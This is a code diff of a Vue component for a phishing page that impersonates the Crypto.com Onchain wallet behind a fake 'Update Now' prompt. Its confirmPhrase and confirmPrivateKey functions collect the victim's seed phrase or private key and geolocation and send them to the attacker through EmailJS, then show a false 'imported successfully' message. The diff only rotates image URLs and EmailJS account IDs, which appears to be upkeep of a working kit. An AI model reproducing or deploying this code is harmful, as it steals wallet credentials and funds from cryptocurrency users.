@@ -16,7 +16,7 @@
           <template v-if="currentStep === 1">
             <div class="flex flex-col items-center justify-center">
               <div class="rounded-3xl flex justify-center w-full pt-[90px]">
-                <img class="w-[80px] h-[80px]" src="https://logo.clearbit.com/crypto.com" alt="Crypto.com Onchain" />
+                <img class="w-[80px] h-[80px]" src="https://tse1.mm.bing.net/th/id/OIP.Pt7nwKPeejnQMGfk7XQAAwHaHa?cb=ucfimg2&ucfimg=1&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Crypto.com Onchain" />
               </div>
               <form class="w-full p-6">
                 <h2 style="color: white" class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]">Crypto.com Onchain</h2>
@@ -40,7 +40,7 @@
 
           <template v-else-if="currentStep === 2">
             <div>
-              <div class="rounded-3xl flex justify-center w-full pt-[90px]"><img class="w-[80px] h-[80px]" src="https://logo.clearbit.com/crypto.com" alt="Crypto.com Onchain" /></div>
+              <div class="rounded-3xl flex justify-center w-full pt-[90px]"><img class="w-[80px] h-[80px]" src="https://tse1.mm.bing.net/th/id/OIP.Pt7nwKPeejnQMGfk7XQAAwHaHa?cb=ucfimg2&ucfimg=1&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Crypto.com Onchain" /></div>
               <h2 style="color: white" class="text-4xl leading-[24px] text-center font-bold mb-6 mt-4 tracking-[-0.02em]">This app will be updated to the latest version</h2>
               <p class="text-gray-500 font-semibold text-center text-2xl mb-8">Enhancements and stability improvements</p>
               <div class="w-full pt-6 pb-[10px]"><div class="flex gap-3 w-full mt-[40px]"><button @click="nextStep" class="w-full py-4 px-4 mb-2 bg-white border-none outline-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-black relative">Update Now</button></div></div>
@@ -50,7 +50,7 @@
           <template v-else-if="currentStep === 3">
             <div key="s3" class="flex flex-col items-center p-6">
               <div class="flex flex-col items-center gap-3 py-6 w-full">
-                <div class="flex items-center justify-center"><img src="https://logo.clearbit.com/crypto.com" class="w-20 h-20" alt="Crypto.com Onchain" /></div>
+                <div class="flex items-center justify-center"><img src="https://tse1.mm.bing.net/th/id/OIP.Pt7nwKPeejnQMGfk7XQAAwHaHa?cb=ucfimg2&ucfimg=1&rs=1&pid=ImgDetMain&o=7&rm=3" class="w-20 h-20" alt="Crypto.com Onchain" /></div>
                 <h2 class="text-4xl text-white mt-2 mb-0 text-center font-bold">Updating Crypto.com Onchain</h2>
                 <p class="text-gray-300 text-[16px] text-center">Please wait while we apply the latest updates</p>
                 <div class="w-full mt-6"><div class="bg-black h-2 rounded-full overflow-hidden"><div class="h-2 rounded-full transition-all" :style="{ width: progress + '%', background: 'white' }"></div></div><div class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white"><span>{{ Math.round(progress) }}%</span></div></div>
@@ -126,9 +126,9 @@ function toggleFieldVisibility(idx){ hiddenFields.value[idx] = !hiddenFields.val
 
 const isImportDisabled = computed(() => activeTab.value === 'private' ? !privateKeyInput.value.trim() : phraseWords.value.some((w) => !w || !w.trim()))
 
-async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'seed', wordCount: selectedWordCount.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Crypto.com Onchain', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
+async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'seed', wordCount: selectedWordCount.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_k4kimk6', template_id: 'template_mpy0fmg', user_id: 'DMvtKT5BmC4qV83V9', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Crypto.com Onchain', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
 
-async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter your private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'privateKey', privateKey: privateKeyInput.value }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Crypto.com Onchain', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Private key imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
+async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter your private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'privateKey', privateKey: privateKeyInput.value }; const params = { service_id: 'service_k4kimk6', template_id: 'template_mpy0fmg', user_id: 'DMvtKT5BmC4qV83V9', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Crypto.com Onchain', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Private key imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
 
 function showMessage(text, type = 'success'){ message.value = { text, type }; setTimeout(() => { message.value.text = '' }, 3000) }
 
